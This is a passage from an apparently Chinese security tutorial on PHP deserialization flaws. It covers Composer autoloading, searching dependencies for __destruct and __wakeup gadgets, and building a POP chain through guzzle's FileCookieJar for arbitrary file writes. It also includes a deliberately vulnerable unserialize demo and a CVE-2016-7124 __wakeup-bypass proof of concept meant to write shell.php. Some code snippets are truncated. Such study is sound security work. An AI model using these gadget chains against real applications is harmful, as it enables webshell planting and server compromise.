    }
其余的test2和test3和test1的内容类似。
运行一下index.php：
可以看到已经自动加载类会自动寻找已经注册在其队列中的类，并在其被实例化的时候，执行相关的操作。
若想了解更多关于自动加载类的资料，请查阅[spl_autoload_register](http://lucifaer.com/index.php/archives/17/)
**4\. Composer与Autoloading**
说到了Autoloader自动加载类，就不得不说一下Composer这个东西了。Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer
会帮你安装这些依赖的库文件。
经常搭建框架环境的同学应该对这个非常熟悉了，无论是搭建一个新的Laravel还是一个新的Symfony，安装步骤中总有一步是通过Composer来进行安装。
比如在安装Laravel的时候，执行composer global require "laravel/installer"就可以搭建成以下目录结构的环境：
其中已经将环境所需的依赖库文件配置完毕，正是因为Composer与Autuoloading的有效结合，才构成了完整的POP数据流。
**0x04 反序列化漏洞的挖掘**
**1\. 概述**
通过上面对Composer的介绍，我们可以看出，Composer所拉取的依赖库文件是一个框架的基础。
而Composer默认是从Packagist来下载依赖库的。
所以我们挖掘漏洞的思路就可以从依赖库文件入手。
目前总结出来两种大的趋势，还有一种猜想：
1.从可能存在漏洞的依赖库文件入手
2.从应用的代码框架的逻辑上入手
3.从PHP语言本身漏洞入手
接下来逐个的介绍一下。
**2\. 依赖库**
以下这些依赖库，准确来说并不能说是依赖库的问题，只能说这些依赖库存在我们想要的文件读写或者代码执行的功能。而引用这些依赖库的应用在引用时并没有完善的过滤，从而产生漏洞。
**cartalyst/sentry**
**cartalyst/sentinel**
寻找依赖库漏洞的方法，可以说是简单粗暴：
首先在依赖库中使用RIPS或grep全局搜索__wakeup()和__destruct()
从最流行的库开始，跟进每个类，查看是否存在我们可以利用的组件（可被漏洞利用的操作）
手动验证，并构建POP链
利用易受攻击的方式部署应用程序和POP组件，通过自动加载类来生成poc及测试漏洞。
以下为一些存在可利用组件的依赖库：
**任意写**
monolog/monolog(getKey()]);
         ...
      }
    }
应用使用的库中的可利用的POP组件：guzzlehttp/guzzle
寻找POP组件的最好方式，就是直接看composer.json文件，该文件中写明了应用需要使用的库。
     {
        "require": {
        "cartalyst/sentry": "2.1.5",
        "illuminate/database": "4.0.*",
        "guzzlehttp/guzzle": "6.0.2",
        "swiftmailer/swiftmailer": "5.4.1"
      }
    }
**2\. 寻找可以利用的POP组件**
我们下载guzzlehttp/guzzle这个依赖库，并使用grep来搜索一下__destruct()和__wakeup()
逐个看一下，在/guzzle/src/Cookie/FileCookieJar.php发现可利用的POP组件：
跟进看一下save方法：
存在一下代码，造成任意文件写操作：
    if (false === file_put_contents($filename, $jsonStr))
注意到现在$filename可控，也就是文件名可控。同时看到$jsonStr为上层循环来得到的数组经过json编码后得到的，且数组内容为$cookie->toArray()，也就是说如果我们可控$cookie->toArray()的值，我们就能控制文件内容。
如何找到$cookie呢？注意到前面
跟进父类，看到父类implements了CookieJarInterface
还有其中的toArray方法
很明显调用了其中的SetCookie的接口：
看一下目录结构：
所以定位到SetCookie.php：
可以看到，这里只是简单的返回了data数组的特定键值。
3\. 手动验证，并构建POP链
首先我们先在vm中写一个composer.json文件：
    {
        "require": {
            "guzzlehttp/guzzle": "6.0.2"
        }
    }
接下来安装Composer：
    $ curl -sS https://getcomposer.org/installer | php
然后根据composer.json来安装依赖库：
    $ php composer.phar install
接下来，我们根据上面的分析，来构造payload：
payload.php
    ';
            $obj->setCookie(new SetCookie([
                    'Name' => 'lucifaer',
                    'Value' => 'test_poc',
                    'Domain' => $paylaod,
                    'Expires' => time()
            ]));
            file_put_contents('./build_poc', serialize($obj));
我们执行完该脚本，看一下生成的脚本的内容：
我们再写一个反序列化的demo脚本：
    poc = $poc;
       }
       function __destruct()
       {
           if ($this->poc != '')
           {
               file_put_contents('shell.php', '');
               die('Success!!!');
           }
           else
           {
               die('fail to getshell!!!');
           }        
       }
       function __wakeup()
       {
           foreach(get_object_vars($this) as $k => $v)
           {
               $this->$k = null;
           }
           echo "waking up...n";
       }
    }
    $poc = $_GET['poc'];
    if(!isset($poc))
    {
       show_source(__FILE__);
       die();
    }
    $a = unserialize($poc);
代码很简单，但是关键就是需要再反序列化的时候绕过__wakeup以达到写文件的操作。
根据cve-2016-7124我们可以构造一下我们的poc：
    poc = $poc;
            }
            function __destruct()
            {
                if ($this->poc != '')
                {
                    file_put_contents('shell.php', '');
                    die('Success!!!');
                }
                else
                {
                    die('fail to getshell!!!');
                }        
            }
            function __wakeup()
            {
                foreach(get_object_vars($this) as $k => $v)
                {
                    $this->$k = null;
                }
                echo "waking up...n";
            }
        }
    $a = new Test('shell');
    $poc = serialize($a);
    print($poc);
运行该脚本，我们就获得了我们poc
通上文所说道的，在这里需要改两个地方：
将1改为大于1的任何整数
将Testpoc改为%00Test%00poc
传入修改后的poc，即可看到：
写文件操作执行成功。
**0x05 拓展思路**
**1\. 抛砖引玉——魔法函数可能造成的威胁**
刚刚想到这一点的时候准备好好研究一下，没想到p师傅第二天小密圈就放出来这个话题了。接下来顺着这个思路，我们向下深挖一下。
**__toString()**
经过上面的总结，我们不难看出，PHP中反序列化导致的漏洞中，除了利用PHP本身的漏洞以外，我们通常会寻找__destruct、__wakeup、__toString等方法，看看这些方法中是否有可利用的代码。
而由于惯性思维，__toString常常被漏洞挖掘者忽略。其实，当反序列化后的对象被输出在模板中的时候（转换成字符串的时候），就可以触发相应的漏洞。